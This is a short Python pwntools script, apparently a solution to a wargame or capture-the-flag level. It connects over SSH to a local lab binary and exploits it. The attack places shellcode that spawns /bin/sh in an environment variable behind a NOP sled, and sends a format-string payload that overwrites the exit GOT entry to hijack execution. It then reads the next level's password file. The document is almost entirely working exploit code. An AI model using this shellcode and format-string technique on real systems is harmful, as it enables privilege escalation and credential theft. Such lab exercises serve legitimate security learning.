#!/usr/bin/env python3

from pwn import *

host = "127.0.0.1"
port = 4242
login = "level05"
password = open("level04/flag").read().strip()
binary = "/home/users/level05/level05"
target_login = "level06"

shell = ssh(host=host, port=port, user=login, password=password)

shellcode = (
    b"\xeb\x1f\x5e\x89\x76\x08\x31\xc0"
    b"\x88\x46\x07\x89\x46\x0c\xb0\x0b"
    b"\x89\xf3\x8d\x4e\x08\x8d\x56\x0c"
    b"\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
    b"\x80\xe8\xdc\xff\xff\xff/bin/sh"
)

env_payload = b"\x90" * 1000 + shellcode

exit_got_addr_1 = p32(0x080497e0)
exit_got_addr_2 = p32(0x080497e2)

payload = exit_got_addr_1 + exit_got_addr_2 + b"%56401d" + b"%10$hn" + b"%9126d" + b"%11$hn"

p = shell.process([binary], env={'PAYLOAD': env_payload})

p.sendline(payload)

p.clean()
p.sendline("whoami")
p.sendline(f"cat ~{target_login}/.pass")
p.interactive()
